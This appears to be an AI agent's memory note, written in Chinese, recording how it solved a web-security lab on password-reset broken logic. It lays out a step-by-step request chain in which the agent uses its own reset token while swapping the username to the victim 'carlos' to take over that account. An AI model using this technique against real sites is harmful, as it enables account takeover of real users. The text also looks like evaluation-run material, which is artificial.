---
metadata:
  node_type: memory
name: "PRS arm A lab-password-reset-broken-logic"
description: "arm A 基线:lab-password-reset-broken-logic 冷实例一次通过 - 自有 token + username=carlos 重置即夺号"
last_updated: 2026-10-08T20:10:46+08:00
created: 2026-10-08T20:10:46+08:00
---

# arm A 基线:lab-password-reset-broken-logic

冷实例(reused:false)一次通过,banner `Congratulations, you solved the lab!`。

## 链
1. page_read lab 页 → widget-lab-id `A2AA25C6...EA087`(description 已给:重置 carlos 口令后登录其 My account;凭据 wiener:peter,受害者 carlos)。
2. range_launch launch <id> --jar /tmp/cj1.json → 实例 URL。
3. GET /forgot-password(仅 username 字段,无 CSRF)。
4. POST /forgot-password username=wiener → "check your email"。
5. GET exploit-server /email → 邮件体含重置链接,token `qti5bq1rcwnlb6707umvz3lnhzshxklm`。
6. GET /forgot-password?temp-forgot-password-token=<T> → 表单字段:temp-forgot-password-token(隐藏)、username(隐藏,wiener)、new-password-1、new-password-2。
7. **破逻辑点**:POST /forgot-password,体带自己的 token,但把 username 改成 `carlos`,new-password-1/2=password123 → 302 Location:/,服务端按 body 里的 username 落库,不校验 token 与用户绑定。
8. 新 jar 登录:GET /login(无 CSRF)→ POST /login username=carlos password=password123 → 302 Location:/my-account?id=carlos。
9. GET /my-account?id=carlos → "Your username is: carlos" / carlos@carlos-montoya.net。
10. banner_verdict → solved:true。

## 要点
- 核心:重置提交的 username 是用户可控参数,且未与 token 所属用户核对 ⇒ 用自己申请到的 token 改任意用户口令。
- 该 lab 登录表单无 CSRF;重置表单 token/username 都是隐藏字段,直接改 body 即可。
- 首个 /my-account 抓取时 banner 仍显示 Not solved,随后 banner_verdict 才返回 solved(判定有延迟,勿以首个页面 banner 为弃权依据)。
- 全程 http_session/page_read/range_launch/banner_verdict,无新件。

